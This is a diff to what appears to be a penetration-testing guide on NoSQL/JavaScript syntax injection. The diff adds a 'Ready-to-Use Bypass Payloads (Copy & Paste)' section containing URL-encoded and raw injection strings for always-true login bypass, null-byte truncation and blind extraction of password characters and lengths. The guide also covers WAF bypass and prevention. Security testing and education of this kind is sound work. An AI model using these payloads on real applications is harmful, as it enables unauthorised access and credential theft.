@@ -457,59 +457,7 @@ fizzy' && /^admin/.test(this.username) && '
 
 ---
 
-## 12. Quick Payload Reference
-
-### Detection Payloads
-
-```
-'                          # Break syntax
-\'                         # Test escape handling
-'"\`{ ;$Foo} $Foo \xYZ     # Fuzz string
-' && 0 && '                # False condition
-' && 1 && '                # True condition
-```
-
-### Bypass Payloads
-
-```
-'||'1'=='1                 # Always true
-'||1||'                    # Always true (short)
-' || true || '             # Always true
-'\u0000                    # Null byte truncation
-'//                        # Comment rest
-```
-
-### Data Extraction Payloads
-
-```
-' && this.password[0]=='a' && '       # Character extraction
-' && this.password.length==8 && '     # Length check
-' && /^admin/.test(this.field) && '   # Regex test
-```
-
-### URL-Encoded Quick Reference
-
-| Payload | URL Encoded |
-|---------|-------------|
-| `'` | `%27` |
-| `"` | `%22` |
-| `\|\|` | `%7c%7c` |
-| `&&` | `%26%26` |
-| `==` | `%3d%3d` |
-| `\x00` | `%00` |
-| `//` | `%2f%2f` |
-| `/*` | `%2f*` |
-| `{` | `%7b` |
-| `}` | `%7d` |
-| `$` | `%24` |
-| `;` | `%3b` |
-| `\n` | `%0a` |
-| `\r` | `%0d` |
-| `space` | `%20` or `+` |
-
----
-
-## 13. Database-Specific Syntax
+## 12. Database-Specific Syntax
 
 ### MongoDB
 
@@ -554,7 +502,7 @@ SELECT * FROM users WHERE username='' OR '1'='1'
 
 ---
 
-## 14. Blind Injection Techniques
+## 13. Blind Injection Techniques
 
 ### Boolean-Based Blind
 
@@ -597,7 +545,7 @@ fizzy' && this.secret.length > 100 && '
 
 ---
 
-## 15. Encoding Variations
+## 14. Encoding Variations
 
 ### Double URL Encoding
 
@@ -636,7 +584,7 @@ fizzy' && this.secret.length > 100 && '
 
 ---
 
-## 16. WAF Bypass Techniques
+## 15. WAF Bypass Techniques
 
 ### Case Variation (for JavaScript)
 
@@ -679,7 +627,7 @@ fizzy'//\n||'1'=='1
 
 ---
 
-## 17. Detection Response Indicators
+## 16. Detection Response Indicators
 
 | Response Type | Indication |
 |---------------|------------|
@@ -705,7 +653,7 @@ unexpected end of input
 
 ---
 
-## 18. Testing Methodology
+## 17. Testing Methodology
 
 ### Step-by-Step Approach
 
@@ -730,7 +678,7 @@ unexpected end of input
 
 ---
 
-## 19. Tools for Syntax Injection
+## 18. Tools for Syntax Injection
 
 | Tool | Purpose |
 |------|---------|
@@ -743,7 +691,7 @@ unexpected end of input
 
 ---
 
-## 20. Prevention & Mitigations
+## 19. Prevention & Mitigations
 
 ### Input Validation
 
@@ -788,6 +736,156 @@ security:
 if (req.headers['content-type'] !== 'application/json') {
     return res.status(400).send('Invalid content type');
 }
+```
+
+---
+
+## 20. Ready-to-Use Bypass Payloads (Copy & Paste)
+
+### Escaped Payloads for URL Context
+
+**Basic always-true bypass:**
+```
+fizzy'%7c%7c'1'%3d%3d'1
+```
+
+**Always-true with OR:**
+```
+fizzy'%7c%7c1%7c%7c'
+```
+
+**Null byte truncation:**
+```
+fizzy'%00
+```
+
+**Comment injection:**
+```
+fizzy'%2f%2f
+fizzy'%2f*
+```
+
+**Boolean true test:**
+```
+fizzy'+%26%26+1+%26%26+'
+```
+
+**Boolean false test:**
+```
+fizzy'+%26%26+0+%26%26+'
+```
+
+### Escaped Payloads for JSON Context
+
+**Basic always-true bypass:**
+```
+fizzy\'||\'1\'==\'1
+```
+
+**Null byte truncation:**
+```
+fizzy\'\u0000
+```
+
+**Boolean true condition:**
+```
+fizzy\' && 1 && \'x
+```
+
+**Boolean false condition:**
+```
+fizzy\' && 0 && \'x
+```
+
+**Character extraction:**
+```
+fizzy\' && this.password[0]==\'a\' && \'x
+```
+
+**Length check:**
+```
+fizzy\' && this.password.length==8 && \'x
+```
+
+### Quick Copy-Paste Table (URL Encoded)
+
+| Attack | URL Encoded Payload |
+|--------|---------------------|
+| Always true (OR) | `'%7c%7c'1'%3d%3d'1` |
+| Always true (short) | `'%7c%7c1%7c%7c'` |
+| Always false | `'%26%26'1'%3d%3d'2` |
+| Null byte | `'%00` |
+| Comment (single) | `'%2f%2f` |
+| Comment (multi) | `'%2f*` |
+| Boolean true | `'+%26%26+1+%26%26+'` |
+| Boolean false | `'+%26%26+0+%26%26+'` |
+
+### Minified One-Liners (URL Encoded — Ready to Use)
+
+```
+'%7c%7c'1'%3d%3d'1
+'%7c%7c1%7c%7c'
+'%26%26'1'%3d%3d'2
+'%00
+'%2f%2f
+'+%26%26+1+%26%26+'
+'+%26%26+0+%26%26+'
+'%26%26+this.password.length%3d%3d8+%26%26+'
+```
+
+### URL-Encoded Quick Reference
+
+| Payload | URL Encoded |
+|---------|-------------|
+| `'` | `%27` |
+| `"` | `%22` |
+| `\|\|` | `%7c%7c` |
+| `&&` | `%26%26` |
+| `==` | `%3d%3d` |
+| `\x00` | `%00` |
+| `//` | `%2f%2f` |
+| `/*` | `%2f*` |
+| `{` | `%7b` |
+| `}` | `%7d` |
+| `$` | `%24` |
+| `;` | `%3b` |
+| `\n` | `%0a` |
+| `\r` | `%0d` |
+| `space` | `%20` or `+` |
+
+### Data Extraction Payloads (URL Encoded)
+
+**Character extraction:**
+```
+'+%26%26+this.password[0]%3d%3d'a'+%26%26+'
+```
+
+**Length check:**
+```
+'+%26%26+this.password.length%3d%3d8+%26%26+'
+```
+
+**Regex test:**
+```
+'+%26%26+/^admin/.test(this.username)+%26%26+'
+```
+
+### Raw Payloads (Non-Encoded)
+
+For reference or tools that handle encoding:
+
+```
+'||'1'=='1
+'||1||'
+' && '1'=='2
+'\u0000
+'//
+'/*
+' && 1 && '
+' && 0 && '
+' && this.password[0]=='a' && '
+' && this.password.length==8 && '
+' && /^admin/.test(this.username) && '
 ```
 
 ---
